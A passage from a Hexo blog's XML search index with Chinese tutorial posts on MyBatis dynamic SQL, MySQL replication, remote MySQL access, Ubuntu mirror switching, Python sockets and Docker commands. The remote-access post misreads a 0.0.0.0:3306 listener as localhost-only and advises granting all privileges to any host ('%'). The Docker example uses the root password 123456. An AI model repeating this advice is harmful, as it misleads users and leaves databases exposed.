class="attr">column</span>=<span class="string">"author_bio"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"favouriteSection"</span> <span class="attr">column</span>=<span class="string">"author_favourite_section"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br></pre></td></tr></table></figure><p>一对多的映射</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">collection</span> <span class="attr">property</span>=<span class="string">"tags"</span> <span class="attr">ofType</span>=<span class="string">"Tag"</span> &gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"tag_id"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">collection</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p><code>sql</code> – 可被其它语句引用的可重用语句块。</p></li><li><p><code>insert</code> – 映射插入语句。</p></li><li><p><code>update</code> – 映射更新语句。</p></li><li><p><code>delete</code> – 映射删除语句。</p></li><li><p><code>select</code> – 映射查询语句</p></li></ul><h2 id="动态sql"><a href="#动态sql" class="headerlink" title="动态sql"></a>动态sql</h2><ul><li>本质上是sql的拼接</li><li>可以通过sql、when、if、foreach等标签进行控制</li></ul><h4 id="if：满足条件就拼接"><a href="#if：满足条件就拼接" class="headerlink" title="if：满足条件就拼接"></a><strong>if</strong>：满足条件就拼接</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"findActiveBlogWithTitleLike"</span></span></span><br><span class="line"><span class="tag">     <span class="attr">resultType</span>=<span class="string">"Blog"</span>&gt;</span></span><br><span class="line">  SELECT * FROM BLOG</span><br><span class="line">  WHERE state = ‘ACTIVE’</span><br><span class="line">  <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"title != null"</span>&gt;</span></span><br><span class="line">    AND title like #&#123;title&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="choose、when、otherwise：只满足其中的一个条件"><a href="#choose、when、otherwise：只满足其中的一个条件" class="headerlink" title="choose、when、otherwise：只满足其中的一个条件"></a><strong>choose</strong>、<strong>when</strong>、<strong>otherwise</strong>：只满足其中的一个条件</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"findActiveBlogLike"</span></span></span><br><span class="line"><span class="tag">     <span class="attr">resultType</span>=<span class="string">"Blog"</span>&gt;</span></span><br><span class="line">  SELECT * FROM BLOG WHERE state = ‘ACTIVE’</span><br><span class="line">  <span class="tag">&lt;<span class="name">choose</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">"title != null"</span>&gt;</span></span><br><span class="line">      AND title like #&#123;title&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">when</span> <span class="attr">test</span>=<span class="string">"author != null and author.name != null"</span>&gt;</span></span><br><span class="line">      AND author_name like #&#123;author.name&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">when</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">otherwise</span>&gt;</span></span><br><span class="line">      AND featured = 1</span><br><span class="line">    <span class="tag">&lt;/<span class="name">otherwise</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">choose</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="where：去处第一个满足条件的查询中的and关键字"><a href="#where：去处第一个满足条件的查询中的and关键字" class="headerlink" title="where：去处第一个满足条件的查询中的and关键字"></a><strong>where</strong>：去处第一个满足条件的查询中的<strong>and</strong>关键字</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"findActiveBlogLike"</span></span></span><br><span class="line"><span class="tag">     <span class="attr">resultType</span>=<span class="string">"Blog"</span>&gt;</span></span><br><span class="line">  SELECT * FROM BLOG</span><br><span class="line">  <span class="tag">&lt;<span class="name">where</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"state != null"</span>&gt;</span></span><br><span class="line">         state = #&#123;state&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"title != null"</span>&gt;</span></span><br><span class="line">        AND title like #&#123;title&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"author != null and author.name != null"</span>&gt;</span></span><br><span class="line">        AND author_name like #&#123;author.name&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="foreach：对集合进行遍历，尤其是在IN关键字中"><a href="#foreach：对集合进行遍历，尤其是在IN关键字中" class="headerlink" title="foreach：对集合进行遍历，尤其是在IN关键字中"></a><strong>foreach</strong>：对集合进行遍历，尤其是在<strong>IN</strong>关键字中</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectPostIn"</span> <span class="attr">resultType</span>=<span class="string">"domain.blog.Post"</span>&gt;</span></span><br><span class="line">  SELECT *</span><br><span class="line">  FROM POST P</span><br><span class="line">  WHERE ID in</span><br><span class="line">  <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">item</span>=<span class="string">"item"</span> <span class="attr">index</span>=<span class="string">"index"</span> <span class="attr">collection</span>=<span class="string">"list"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">open</span>=<span class="string">"("</span> <span class="attr">separator</span>=<span class="string">","</span> <span class="attr">close</span>=<span class="string">")"</span>&gt;</span></span><br><span class="line">        #&#123;item&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="缓存技术"><a href="#缓存技术" class="headerlink" title="缓存技术"></a>缓存技术</h2><h4 id="mysql主从复制原理"><a href="#mysql主从复制原理" class="headerlink" title="mysql主从复制原理"></a>mysql主从复制原理</h4><ul><li>在每个事物更新数据前，Master服务器在二进制日志中记录这些改变，记录完成后Master服务器通知存储引擎提交事务；</li><li>Slave服务器将Master服务器的日志复制到其中继日志（Relay log）。首先Slave开始一个工作线程I/O，I/O线程在Master上打开一个连接，开始Binary log dump process，Binary log dump process从Master二进制日志中读取时间，如果已经跟上Master，它会睡眠等待Master产生的新事件。I/O线程将这些时间写入</li><li>SQL slave thread（SQL从线程）从中继日志中读取事件，并重放其中的事件从而更新Slave上的数据，使其与Master一致，只要该线程与I/O线程保持一致，中继日志通常会位于系统的缓存中，所以中继日志开销很小。<img src="/home/huzai/图片/2020-09-21 20-52-02 的屏幕截图.png" alt="2020-09-21 20-52-02 的屏幕截图"></li></ul><h4 id="mysql读写分离原理"><a href="#mysql读写分离原理" class="headerlink" title="mysql读写分离原理"></a>mysql读写分离原理</h4><ul><li><p>读写分离就是在主服务器上写，只在从服务器上读。基本原理是让主数据库处理事务性查询，而从数据库处理select查询。数据库复制被用来把事务性查询导致的变更同步到群集中的数据库。</p><p>基于中间代理层实现：代理一般位于客户端和服务端之间，代理服务器接到客户端请求通过判断转发到后端数据库，这部分通过Amoeba实现。</p><p><img src="/home/huzai/图片/2020-09-21 20-54-32 的屏幕截图.png" alt="2020-09-21 20-54-32 的屏幕截图"></p></li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>mysql远程连接</title>
      <link href="/2020/10/16/mysql%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/"/>
      <url>/2020/10/16/mysql%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="3306-端口"><a href="#3306-端口" class="headerlink" title="3306 端口"></a>3306 端口</h2><ul><li>此前确保3306端口是打开的(<strong>服务器防火墙</strong>)</li><li><p>在服务器中查看端口状态  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an|grep 3306</span><br></pre></td></tr></table></figure></li><li><p>如果仅仅出现👇下面的信息,则说明3306端口仅仅对localhost开放,外网是无法访问的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN</span><br></pre></td></tr></table></figure></li><li><p>你需要找到<strong>mysql.cnf</strong> mysql 的配置文件,有可能不止一个,且不一定和我的文件名一样,</p></li><li><p>找到.cnf配置文件中的,将其注释</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#bind-address = 127.0.0.1</span><br></pre></td></tr></table></figure></li><li><p>如果像我这样,就说明端口是开放的,且已经有主机连接<br><img src="/2020/10/16/mysql远程连接/1.jpg" alt="1.jpg"></p></li></ul><h2 id="mysql用户权限"><a href="#mysql用户权限" class="headerlink" title="mysql用户权限"></a>mysql用户权限</h2><ul><li>在mysql的mysql表中,有用户信息</li><li><p>查看你的用户是否允许,除localhost以外的ip访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select host,user from user;</span><br></pre></td></tr></table></figure></li><li><p>如图,想要外网访问的用户,其对应的host应该是外网ip</p></li><li><p>如果想要任意ip访问,其对应的host设置为“<strong>%</strong>”<br><img src="/2020/10/16/mysql远程连接/2.jpg" alt="2.jpg"></p></li><li><p>或者你可以直接创建一个新用户,给他权限</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant all on database_name.* to user_name@&apos;%&apos; identified by &apos;user_password&apos;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ubuntu自动换源</title>
      <link href="/2020/07/09/ubuntu%E8%87%AA%E5%8A%A8%E6%8D%A2%E6%BA%90/"/>
      <url>/2020/07/09/ubuntu%E8%87%AA%E5%8A%A8%E6%8D%A2%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<h2 id="下载huanyuan-sh"><a href="#下载huanyuan-sh" class="headerlink" title="下载huanyuan.sh"></a>下载huanyuan.sh</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span>  git@github.com:huzai9527/ubuntu_huanyuan.git</span><br></pre></td></tr></table></figure><h2 id="进入文件夹"><a href="#进入文件夹" class="headerlink" title="进入文件夹"></a>进入文件夹</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bash huanyuan.sh</span><br></pre></td></tr></table></figure><h2 id="期间需要你输入管理员密码"><a href="#期间需要你输入管理员密码" class="headerlink" title="期间需要你输入管理员密码"></a>期间需要你输入管理员密码</h2>]]></content>
      
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python网络编程</title>
      <link href="/2020/07/08/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
      <url>/2020/07/08/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="套接字类型"><a href="#套接字类型" class="headerlink" title="套接字类型"></a>套接字类型</h2><h3 id="面向连接的套接字"><a href="#面向连接的套接字" class="headerlink" title="面向连接的套接字"></a>面向连接的套接字</h3><pre><code>- 基于TCP/IP，使用SOCKET_STREAM作为套接字类型</code></pre><h3 id="无连接的套接字"><a href="#无连接的套接字" class="headerlink" title="无连接的套接字"></a>无连接的套接字</h3><pre><code>- 基于UDP/IP，使用SOCKET_DGRAM作为套接字类型</code></pre><h2 id="pyhton中的网络编程"><a href="#pyhton中的网络编程" class="headerlink" title="pyhton中的网络编程"></a>pyhton中的网络编程</h2><h3 id="socket模块"><a href="#socket模块" class="headerlink" title="socket模块"></a>socket模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket(socket_family, socket_type, protocol = <span class="number">0</span>)</span><br></pre></td></tr></table></figure><ul><li>其中socket_family 是选择网络类型,本地网（AF_UNIX）还是因特网(AF_INET)</li><li><p>socket_type 是选择套接字的类型, protocaol默认为0</p><h3 id="套接字对象常用的方法"><a href="#套接字对象常用的方法" class="headerlink" title="套接字对象常用的方法"></a>套接字对象常用的方法</h3><ul><li>服务器套接字<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s.bind() <span class="comment">#将主机号端口号绑定到套接字上</span></span><br><span class="line">s.listen() <span class="comment">#设置并启动TCP监听器</span></span><br><span class="line">s.accept() <span class="comment">#被动接受客户端连接</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li>客户端套接字<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s.connect() <span class="comment">#主动发起TCP服务连接</span></span><br><span class="line">s.connect_ex() <span class="comment">#此时会以错误码的形式抛出问题而不是一大串异常</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="创建一个时间戳服务器"><a href="#创建一个时间戳服务器" class="headerlink" title="创建一个时间戳服务器"></a>创建一个时间戳服务器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime</span><br><span class="line">HOST = <span class="string">''</span></span><br><span class="line">PORT = <span class="number">23456</span></span><br><span class="line">ADDR = (HOST, PORT)</span><br><span class="line">BUFSIZE = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">tcpSerSocket = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">tcpSerSocket.bind(ADDR)</span><br><span class="line">tcpSerSocket.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    print(<span class="string">"waiting for connection ..."</span>)</span><br><span class="line">    tcpCliSocket, addr = tcpSerSocket.accept()</span><br><span class="line">    print(<span class="string">"connected from:"</span>, addr)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        data = tcpCliSocket.recv(BUFSIZE)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        tcpCliSocket.send(data+<span class="string">b' time now:'</span>+bytes(ctime(), <span class="string">'utf-8'</span>))</span><br><span class="line">    tcpCliSocket.close()</span><br><span class="line">tcpSerSocket.close()</span><br></pre></td></tr></table></figure><h3 id="创建一个客户机"><a href="#创建一个客户机" class="headerlink" title="创建一个客户机"></a>创建一个客户机</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime</span><br><span class="line">HOST = <span class="string">"192.168.0.118"</span></span><br><span class="line">PORT = <span class="number">23456</span></span><br><span class="line">ADDR = (HOST, PORT)</span><br><span class="line">BUFSIZE = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line">tcpCliSocket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">tcpCliSocket.connect(ADDR)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    data = input(<span class="string">'&gt; '</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 网络编程 python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>docker常用命令</title>
      <link href="/2020/07/01/docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2020/07/01/docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="docker-command-help"><a href="#docker-command-help" class="headerlink" title="docker command help"></a>docker command help</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">command</span> --<span class="built_in">help</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/01/docker常用命令/1.jpg" alt="1"></p><h2 id="use-images"><a href="#use-images" class="headerlink" title="use images"></a>use images</h2><h3 id="list-images"><a href="#list-images" class="headerlink" title="list images"></a>list images</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p><img src="/2020/07/01/docker常用命令/2.jpg" alt="2"></p><h3 id="start-container-by-image"><a href="#start-container-by-image" class="headerlink" title="start container by image"></a>start container by image</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -t -i ubuntu:16.04 /bin/bash</span><br></pre></td></tr></table></figure><p><img src="/2020/07/01/docker常用命令/3.jpg" alt="3"></p><h3 id="search-images"><a href="#search-images" class="headerlink" title="search images"></a>search images</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search mysql</span><br></pre></td></tr></table></figure><p><img src="/2020/07/01/docker常用命令/5.jpg" alt="5"></p><h3 id="get-new-images"><a href="#get-new-images" class="headerlink" title="get new images"></a>get new images</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull ubuntu:18.04</span><br></pre></td></tr></table></figure><p><img src="/2020/07/01/docker常用命令/4.jpg" alt="4"></p><h3 id="delete-image"><a href="#delete-image" class="headerlink" title="delete image"></a>delete image</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi ubuntu:18.04</span><br></pre></td></tr></table></figure><p><img src="/2020/07/01/docker常用命令/6.jpg" alt="6"></p><h3 id="more-operations-https-www-runoob-com-docker-docker-image-usage-html"><a href="#more-operations-https-www-runoob-com-docker-docker-image-usage-html" class="headerlink" title="[more operations][https://www.runoob.com/docker/docker-image-usage.html] "></a><strong>[more operations][<a href="https://www.runoob.com/docker/docker-image-usage.html]" target="_blank" rel="noopener">https://www.runoob.com/docker/docker-image-usage.html]</a> </strong></h3><h2 id="use-container"><a href="#use-container" class="headerlink" title="use container"></a>use container</h2><h3 id="start-container"><a href="#start-container" class="headerlink" title="start container"></a>start container</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -t -i ubuntu:16.04 /bin/bash <span class="comment">## -d background</span></span><br></pre></td></tr></table></figure><h3 id="show-containers"><a href="#show-containers" class="headerlink" title="show containers"></a>show containers</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p><img src="/2020/07/01/docker常用命令/7.jpg" alt="7"></p><h3 id="stop-amp-start-amp-restart-container"><a href="#stop-amp-start-amp-restart-container" class="headerlink" title="stop &amp; start &amp; restart container"></a>stop &amp; start &amp; restart container</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker start container_id <span class="comment">## RUN IN THE BACKGROUND</span></span><br><span class="line">docker stop container_id</span><br><span class="line">docker restart container_id</span><br></pre></td></tr></table></figure><h3 id="enter-container"><a href="#enter-container" class="headerlink" title="enter container"></a>enter container</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker attach container_id <span class="comment">## use exit will stop container</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it container_id /bin/bash  <span class="comment">## use exit will not stop container</span></span><br></pre></td></tr></table></figure><h3 id="export-container"><a href="#export-container" class="headerlink" title="export container"></a>export container</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">export</span> container_id &gt; container.tar</span><br></pre></td></tr></table></figure><h3 id="import-container-snap-to-image"><a href="#import-container-snap-to-image" class="headerlink" title="import container_snap to image"></a>import container_snap to image</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat docker/mysql.tar | docker import - mysql:v1</span><br></pre></td></tr></table></figure><p><img src="/2020/07/01/docker常用命令/9.jpg" alt="8"></p><h3 id="delete-container"><a href="#delete-container" class="headerlink" title="delete container"></a>delete container</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm -f container_id</span><br></pre></td></tr></table></figure><h3 id="show-container’s-port-mapping"><a href="#show-container’s-port-mapping" class="headerlink" title="show container’s port mapping"></a>show container’s port mapping</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker port container_id</span><br></pre></td></tr></table></figure><p><img src="/2020/07/01/docker常用命令/9.jpg" alt="9"></p><h3 id="connect-container-by-port-mapping"><a href="#connect-container-by-port-mapping" class="headerlink" title="connect container by port mapping"></a>connect container by port mapping</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 3306:3306 -e MYSQL_ROOT_PASSWORD = 123456 mysql</span><br></pre></td></tr></table></figure><h2 id="connect-containers"><a href="#connect-containers" class="headerlink" title="connect containers"></a>connect containers</h2><h3 id="create-a-docker-network"><a href="#create-a-docker-network" class="headerlink" title="create a docker network"></a>create a docker network</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network create -d bridge hadoop-net</span><br></pre></td></tr></table></figure><h3 id="show-networks"><a href="#show-networks" class="headerlink" title="show networks"></a>show networks</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network ls</span><br></pre></td></tr></table></figure><h3 id="run-a-container-and-connect-to-the-network"><a href="#run-a-container-and-connect-to-the-network" class="headerlink" title="run a container and connect to the network"></a>run a container and connect to the network</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd --name hadoop1 --network hadoop-net ubuntu /bin/bash</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>测试异地管理</title>
      <link href="/2020/06/30/%E6%B5%8B%E8%AF%95%E5%BC%82%E5%9C%B0%E7%AE%A1%E7%90%86/"/>
      <url>/2020/06/30/%E6%B5%8B%E8%AF%95%E5%BC%82%E5%9C%B0%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="test"><a href="#test" class="headerlink" title="test"></a>test</h1>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/06/30/hello-world/"/>
      <url>/2020/06/30/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>数据分析----数据清洗</title>
      <link href="/2019/01/20/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97/"/>
      <url>/2019/01/20/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97/</url>
      
